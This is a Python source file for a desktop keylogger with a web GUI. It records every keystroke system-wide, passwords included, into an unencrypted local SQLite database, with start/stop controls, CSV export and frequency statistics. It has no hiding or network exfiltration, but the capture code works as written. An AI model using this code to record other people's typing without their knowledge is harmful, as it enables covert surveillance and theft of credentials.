import eel
from pynput import keyboard
import sqlite3
from datetime import datetime
import csv
import os

# Global variable to control keylogging
is_logging = False
session_id = None

# Database setup
def setup_database():
    conn = sqlite3.connect('keystrokes.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            key_pressed TEXT,
            timestamp DATETIME,
            session_id INTEGER
        )
    ''')
    conn.commit()
    conn.close()

# Call setup on startup
setup_database()

# Function to handle key press events
def on_press(key):
    if is_logging:
        try:
            keystroke = key.char
        except AttributeError:
            keystroke = str(key)

        if keystroke in ['Key.shift', 'Key.ctrl', 'Key.alt', 'Key.caps_lock']:
            return

        conn = sqlite3.connect('keystrokes.db')
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO keystrokes (key_pressed, timestamp, session_id)
            VALUES (?, ?, ?)
        ''', (keystroke, datetime.now(), session_id))
        conn.commit()
        conn.close()

# Start keylogging
def start_keylogger():
    global is_logging, session_id
    is_logging = True
    session_id = int(datetime.now().timestamp())
    print("Keylogging started. Session ID:", session_id)

# Stop keylogging
def stop_keylogger():
    global is_logging
    is_logging = False
    print("Keylogging stopped.")

# Export logs to CSV
@eel.expose
def export_to_csv():
    conn = sqlite3.connect('keystrokes.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM keystrokes")
    data = cursor.fetchall()
    with open('keystrokes_export.csv', 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['ID', 'Key Pressed', 'Timestamp', 'Session ID'])
        writer.writerows(data)
    conn.close()
    print("Data exported to keystrokes_export.csv")

# Get keystroke stats
@eel.expose
def get_stats():
    conn = sqlite3.connect('keystrokes.db')
    cursor = conn.cursor()
    cursor.execute("SELECT key_pressed, COUNT(*) FROM keystrokes GROUP BY key_pressed ORDER BY COUNT(*) DESC")
    stats = cursor.fetchall()
    conn.close()
    return stats

# Get recent keystrokes
@eel.expose
def get_recent_keys():
    conn = sqlite3.connect('keystrokes.db')
    cursor = conn.cursor()
    cursor.execute("SELECT key_pressed FROM keystrokes ORDER BY id DESC LIMIT 10")
    keys = [row[0] for row in cursor.fetchall()]
    conn.close()
    return keys

# Get current status
@eel.expose
def get_status():
    return "Logging" if is_logging else "Idle"

# Set up the keyboard listener
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Initialize Eel
eel.init("web")

# Expose Python functions to JavaScript
@eel.expose
def start_logging():
    start_keylogger()

@eel.expose
def stop_logging():
    stop_keylogger()

# Start the Eel application with a larger window size
eel.start("index.html", size=(800, 600))
